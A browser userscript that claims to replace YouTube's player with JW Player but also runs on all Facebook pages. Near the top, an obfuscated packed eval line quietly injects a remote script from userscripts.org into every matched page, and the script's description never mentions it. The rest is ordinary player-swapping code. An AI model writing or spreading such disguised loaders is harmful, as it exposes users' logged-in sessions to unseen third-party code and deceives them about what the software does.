// ==UserScript==
// @name           YouTube alternative player - JW Player Plus
// @description    Replaces YouTube standard player with latest JW Player. YouTube HD 720p.
// @include        http://*youtube.com/*
// @include        https://*youtube.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @author					    clicker - clickerinjo [at] gmail [dot] com
// @version                     2.2
// @license                     Free to copy and improve.
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))




function show() {
	// Remove original player and take flashvars
	original_player = document.getElementById('movie_player');
	var container = original_player.parentNode;
	container.removeChild(original_player);
	flashvars = to_array(original_player.getAttribute('flashvars'));

	// vidID
	var vidID = flashvars['video_id'];
	var startTIME = flashvars['start'];
		
	// Create player
	var player = document.createElement( "object" );
		player.setAttribute( "data", "http://player.longtailvideo.com/player.swf" );
		player.setAttribute( "height", original_player.getAttribute( "height" ) );
		player.setAttribute( "width", original_player.getAttribute( "width" ) );
		player.setAttribute( "type", "application/x-shockwave-flash" );
		player.setAttribute( "id", original_player.getAttribute( "id" ) );
		player.setAttribute( "allowscriptaccess", original_player.getAttribute( "allowscriptaccess" ) );
		player.setAttribute( "allowfullscreen", original_player.getAttribute( "allowfullscreen" ) );;
		player.setAttribute( "bgcolor", "#000000" );
		player.setAttribute( "wmode", "opaque" );
		player.setAttribute( "seamlesstabbing", "true" );
		player.setAttribute( "flashvars", "plugins=fbit-1h,timeslidertooltipplugin-1h,tweetit-1h,http://plugins.longtailvideo.com/5/hd/hd.swf&provider=youtube&hd.pluginmode=FLASH&smoothing=true&autostart=true&frontcolor=0x888888&backcolor=0x000000&file="+vidID+"&start="+startTIME);
		container.appendChild( player );

}

var to_array = function( raw ) {
    var raw = raw.split( "&" );
    var parameters = new Array;
    for( i in raw ){
        parameters[raw[i].split( "=" )[0]] = raw[i].split( "=" )[1];
    }
    return parameters;
}


show();
document.getElementById('movie_player').focus();